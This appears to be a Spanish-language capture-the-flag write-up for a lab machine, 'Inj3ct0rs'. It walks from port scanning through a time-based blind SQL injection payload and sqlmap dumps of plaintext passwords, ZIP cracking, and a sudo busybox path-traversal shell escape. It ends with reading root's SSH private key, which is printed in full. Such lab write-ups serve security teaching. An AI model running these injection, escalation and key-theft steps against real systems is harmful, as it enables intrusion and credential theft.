
```markdown
# Reporte Técnico de Intrusión: Máquina Inj3ct0rs

Este reporte documenta la auditoría de seguridad y el proceso de explotación de la máquina **Inj3ct0rs**, detallando los hallazgos técnicos, comandos ejecutados y la obtención de privilegios hasta el control total del sistema (`root`).

---

## 1. Despliegue del Entorno

El laboratorio se inicializó en un entorno controlado mediante la descompresión del paquete principal y la ejecución del script de despliegue automatizado:

```bash
unzip inj3ct0rs.zip
bash auto_run.sh inj3ct0rss.tar

```

* **IP Asignada:** `172.17.0.2` (Target final detectado en los logs: `172.22.0.2`)
* **Nota Operativa:** Al finalizar la auditoría, el uso de `Ctrl+C` detiene el script y destruye automáticamente el contenedor, garantizando la limpieza de archivos basura en el sistema host.

---

## 2. Reconocimiento y Escaneo de Puertos

Se realizaron dos fases de escaneo con `nmap`. La primera para descubrir puertos abiertos y la segunda para enumerar versiones y scripts por defecto.

```bash
# Escaneo rápido de todos los puertos (TCP)
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.22.0.2

# Escaneo de servicios y versiones objetivo
nmap -sCV -p22,80 172.22.0.2

```

### Servicios Detectados:

* **Puerto 22/TCP (SSH):** OpenSSH 9.6p1 Ubuntu (3ubuntu13.4).
* **Puerto 80/TCP (HTTP):** Apache httpd 2.4.58 (Ubuntu). Título del sitio: *Inj3ct0rs CTF - Página Principal*.
* **Backend:** Presencia de un servidor de bases de datos MySQL evidenciado en las funciones de Login y Registro de la web.

---

## 3. Vector de Acceso Inicial: SQL Injection (SQLi)

Al analizar los formularios web, se interceptó la petición POST del login en `/content_pages_hidden/db.php` utilizando Burp Suite, guardando el contenido en un archivo llamado `request.txt`:

```http
POST /content_pages_hidden/db.php HTTP/1.1
Host: 172.22.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close
Referer: [http://172.22.0.2/login.php](http://172.22.0.2/login.php)

username=admin&password=admin

```

Se procedió a automatizar la inyección con `sqlmap`, detectando que el parámetro `password` es vulnerable a **Time-based blind** (Inyección ciega basada en tiempo) utilizando el payload:
`admin' AND (SELECT 1525 FROM (SELECT(SLEEP(5)))JwlH) AND 'NaxG'='NaxG`

### Fases de Extracción de Datos con SQLMap:

```bash
# 1. Enumerar bases de datos
sqlmap -r request.txt --dbs

# 2. Enumerar tablas de la base de datos objetivo
sqlmap -r request.txt -D injectors_db --tables

# 3. Enumerar columnas de la tabla identificada
sqlmap -r request.txt -D injectors_db -T users --columns

# 4. Volcado de credenciales
sqlmap -r request.txt -D injectors_db -T users -C id,username,password --dump

```

### Tabla de Usuarios Extraída:

| id | username | password |
| --- | --- | --- |
| 1 | **root** | `loveyou` |
| 2 | **jane** | `chicago123` |
| 3 | **admin** | `password` |
| 4 | **ralf** | `no_mirar_en_este_directorio` |

---

## 4. Análisis de Directorios y Criptoanálisis (Fuerza Bruta)

La contraseña del usuario ralf (`no_mirar_en_este_directorio`) apuntaba a la existencia de una ruta web oculta: `http://172.22.0.2/no_mirar_en_este_directorio/`. Al acceder, se descargó el archivo protegido `secret.zip`.

### Craqueo del archivo ZIP:

Se extrajo el hash del archivo comprimido y se realizó un ataque de fuerza bruta con `john` y el diccionario corporativo/por defecto:

```bash
zip2john secret.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash

```

* **Contraseña del ZIP descubierta:** `computer`

Al descomprimir con `unzip secret.zip` e inspeccionar el archivo `confidencial.txt`, se obtuvieron las credenciales reales de acceso SSH:

```text
You have to change your password ralf, I have told you many times...
Your new credentials are: ralf:supersecurepassword

```

---

## 5. Intrusión y Movimiento Lateral (Usuario: capa)

Se estableció acceso inicial por SSH al servidor:

```bash
ssh ralf@172.22.0.2

```

* **Flag de Usuario (1/2):** Acceso al archivo `user.txt` con hash `382af2fb41eb95b1d6c6358b6c55ffce`.

### Pivoteo al usuario `capa`:

Al ejecutar `sudo -l`, se detectó que el usuario `ralf` puede ejecutar un binario específico como el usuario `capa` sin proporcionar contraseña:

```text
(capa : capa) NOPASSWD: /usr/local/bin/busybox /nothing/*

```

Aprovechando el uso del comodín `*`, se aplicó una técnica de **Path Traversal** para evadir la restricción del directorio `/nothing/` y forzar la ejecución de una shell:

```bash
sudo -u capa /usr/local/bin/busybox /nothing/../usr/bin/sh
/bin/bash

```

---

## 6. Escalada de Privilegios a Root

Dentro del contexto del usuario `capa`, se revisaron nuevamente los privilegios de sudo disponibles en el sistema mediante `sudo -l`:

```text
User capa may run the following commands:
    (ALL : ALL) NOPASSWD: /bin/cat

```

Dado que el binario `/bin/cat` se puede ejecutar con privilegios de cualquier usuario (incluido `root`), se procedió a leer de forma legítima la clave privada SSH del administrador:

```bash
sudo /bin/cat /root/.ssh/id_rsa

```

### Captura de la Clave Privada (id_rsa):

```text
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

Para concluir el compromiso de la máquina, se guardó la clave en el host atacante, se configuraron los permisos correspondientes (`600`) para validar la identidad ante OpenSSH y se inició sesión como el usuario administrador:

```bash
# Importación y configuración de la llave privada
nano id_rsa
chmod 600 id_rsa

# Conexión final de root
ssh -i id_rsa root@172.22.0.2

```

* **Flag del Administrador (2/2):** Acceso al archivo `/root/true_root.txt` con contenido `8e776bdaed0b6748686b7ce6d38ccca3`.

```

```
